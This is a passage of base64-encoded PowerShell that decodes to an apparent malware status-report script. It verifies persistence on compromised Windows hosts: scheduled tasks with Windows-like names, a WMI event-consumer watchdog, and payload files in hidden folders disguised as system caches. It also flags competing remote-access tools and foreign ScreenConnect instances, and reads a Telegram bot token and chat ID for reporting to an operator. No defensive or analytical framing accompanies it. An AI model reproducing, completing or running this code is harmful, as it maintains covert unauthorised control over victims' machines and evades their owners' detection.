dXJlciA9ICRjcy5NYW51ZmFjdHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdp
bjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5h
bWUpCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2lt
SW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkg
ewogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIg
IkRldmljZUlEPSdDOiciCiAgICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
LkZyZWVTcGFjZSAvIDFHQiwgMSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuU2l6ZSAvIDFHQiwgMSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5j
dGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykg
eyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScg
LWYgJHMuU3RhdHVzLCAkcy5TdGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtz
dHJpbmddJHRuKSB7CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgewogICAgICAgIHJldHVybiBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lO
Ryc7IE5leHQgPSAnJzsgTGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAg
ICB9CiAgICAkbWFwID0gQHt9CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0pIC1qb2luICJgbiIKICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBp
ZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAg
JG1hcFskbWF0Y2hlc1sxXS5UcmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgJHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7
ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsg
JHN0YXR1cyA9ICdwcmVzZW50JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQog
ICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3Qg
UnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
JycgfQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kp
b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAg
IyBQcmVzZW50IFdpbmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkg
Zm9yIHVzCiAgICAkaGVhbHRoeSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8
UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAg
ICAgIFByZXNlbnQgPSAkdHJ1ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAg
IEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3Vycykg
eyAkc3RhdHVzIH0gZWxzZSB7ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQK
ICAgICAgICBMYXN0ICAgID0gJGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAg
IFRyICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0
aW9uIEdldC1SbW1IaXRzIHsKICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6
IFNjcmVlbkNvbm5lY3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5z
ID0gQCgKICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0Fn
ZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2lu
Vk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1
c3REZXNrJywgJ1JlbW90ZVBDJywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdB
dGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScs
ICdBZ2VudE1vbicsICdQdWxzZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8n
LAogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENl
bnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lz
ZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAn
U2ltcGxlSGVscCcsICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2gg
Q2VudHJhbCcsICdNZXNoIEFnZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxy
bW0nLCAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywK
ICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0Jywg
J0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAn
TmF2ZXJpc2snLCAnSW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJl
cicsICdEb21vdHonLCAnQXV2aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQg
V29ya3BsYWNlJywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
RFEgQ29ubmVjdCcsCiAgICAgICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdU
YWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcics
ICdBZXJvQWRtaW4nLAogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5l
JywgJ0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5D
JywgJ1JlYWxWTkMnCiAgICApCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0
YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9
IEB7fQoKICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
ewogICAgICAgICRrZXkgPSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRr
ZXldID0gJHRydWUKICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtl
ZXBOYW1lKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNl
IH0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiok
ayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAg
R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJG4gPSAkXy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAg
ICAgIGlmIChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAt
b3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tl
ZXAtZGF0dG8nICgiJG4gKCQoJF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAg
IHJldHVybgogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAg
ICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAg
ICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3Mg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JG4gPSAkXy5Qcm9jZXNzTmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVy
biB9CiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4g
LWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAg
ICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0
ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZv
cmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAg
ICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykg
eyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAg
ICAgICAgIH0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAn
bXNpJyAkZG4KICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBH
ZXQtR3J5eGFLZWVwRnAgewogICAgJGZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiAgICAkcCA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5j
ZmcnCiAgICBpZiAoJFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNm
ZycgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05
YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsKICAg
ICRncnl4YUZwID0gR2V0LUdyeXhhS2VlcEZwCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBp
ZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBl
bHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcn
KSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxzZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJGdyeXhhRnApIHsg
J0tFRVAtR1JZWEEnIH0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQogICAgfQoKICAgICRy
b290cyA9IEAoCiAgICAgICAgIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGll
bnQqIiwKICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xp
ZW50KiIKICAgICkKICAgIGZvcmVhY2ggKCRwYXQgaW4gJHJvb3RzKSB7CiAgICAgICAgR2V0LUNo
aWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQogICAgICAgIH0KICAg
IH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxc
KicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRl
bVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsKICAgICAgICAgICAgJF8uRGlzcGxheU5hbWUgLWxpa2UgJypTY3JlZW5Db25uZWN0KicK
ICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9CiAgICAgICAg
ICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gbXNpOiA8Y29kZT57MH08L2NvZGU+IHZ7MX0nIC1mIChF
c2MgJF8uRGlzcGxheU5hbWUpLCAoRXNjICR2ZXIpKSkKICAgICAgICB9CiAgICB9CgogICAgaWYg
KCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9CiAgICBy
ZXR1cm4gJGxpc3QKfQoKJGNmZyA9IEdldC1DZmcKaWYgKC1ub3QgJGNmZy5CT1RfVE9LRU4gLW9y
IC1ub3QgJGNmZy5DSEFUX0lEKSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgZXhpdCAyCn0KCiRwcmltID0gJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScKJGFsdCA9ICdTY3JlZW5Db25uZWN0IENsaWVu
dCAoZjg2MWM4MTQwZDQ1MzQyNyknCiRvcyA9IEdldC1Pc0luZm8KJHdobyA9IFtTZWN1cml0eS5Q
cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKJGVsZXYgPSAoW1Nl
Y3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgKICAgIFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikKJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScKCiRt
c2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScKJG1zaVNpemUgPSBpZiAoVGVz
dC1QYXRoICRtc2lDYWNoZSkgewogICAgJ3swOk4wfSBLQicgLWYgKChHZXQtSXRlbSAkbXNpQ2Fj
aGUgLUZvcmNlKS5MZW5ndGggLyAxS0IpCn0gZWxzZSB7ICdub25lJyB9CgokbW9uUGF0aCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0
YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCIKJGhhc01v
biA9IFRlc3QtUGF0aCAkbW9uUGF0aAokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24KCiMgVDEw
OiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQKZnVuY3Rpb24gR2V0LVBheWxvYWRCdWlsZChbc3RyaW5n
XSRmaWxlKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAg
ICAgICAgaWYgKCRsIC1tYXRjaCAnQlVJTERccytcZHs4fShbQS1aXStcZCspJykgeyByZXR1cm4g
JG1hdGNoZXNbMV0gfQogICAgfQogICAgcmV0dXJuICc/Jwp9CiRiTW9uID0gR2V0LVBheWxvYWRC
dWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpCiRiU2VjID0gR2V0LVBheWxv
YWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpCiRiVGdyID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICd0Z19yZXBvcnQucHMxJykKJGJMaWIg
PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykKCiMg
cGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5
LmNmZyB3aGVuIHByZXNlbnQKJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRpZE1hcCA9IEB7fQppZiAoVGVzdC1QYXRoICRpZENmZykgewogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFd
XSA9ICRtYXRjaGVzWzJdIH0KICAgIH0KfQokZXhwZWN0ZWRUYXNrcyA9IEAoCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdXZXJRdWV1
ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LAogICAg
QHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAn
UGxhU2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChjaGFp
bjEpIiB9LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9
LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVs
c2UgeyAnVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQop
CiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbgokd21pQyA9IEdldC1XbWlPYmpl
Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENv
bnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdh
dGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3
bWlDKSB9CgokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KJHRhc2tPayA9IDAKJHRhc2tCYWQgPSAwCmZvcmVhY2ggKCR0IGluICRl
eHBlY3RlZFRhc2tzKSB7CiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7CiAgICAgICAg
aWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsr
OyAkbWFyayA9ICdNSVNTSU5HJyB9CiAgICAgICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7
MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNj
ICR0LlJvbGUpKSkKICAgICAgICBjb250aW51ZQogICAgfQogICAgJGggPSBHZXQtVGFza0hlYWx0
aCAkdC5OYW1lCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsKICAgICAgICAk
dGFza09rKysKICAgICAgICAkbWFyayA9ICdPSycKICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1h
bmQgLW5vdCAkaC5PdXJzKSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ05P
VF9PVVJTJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsKICAgICAgICAkdGFza0JhZCsrCiAg
ICAgICAgJG1hcmsgPSAnV0VBSycKICAgIH0gZWxzZSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAg
ICAgICRtYXJrID0gJ01JU1NJTkcnCiAgICB9CiAgICAkZXh0cmEgPSAnJwogICAgaWYgKCRoLlBy
ZXNlbnQpIHsKICAgICAgICAkYml0cyA9IEAoKQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJp
dHMgKz0gJGguU3RhdHVzIH0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJl
c3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9CiAg
ICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywg
JykgKyAnKScgfQogICAgfQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2Rl
PnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJv
bGUpLCAoRXNjICRleHRyYSkpKQp9CgokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQokYWx0
TGluZSA9IEdldC1TdmNMaW5lICRhbHQKJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmlu
ZyonCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
CgokZW1vamlNYXAgPSBAewogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpCiAg
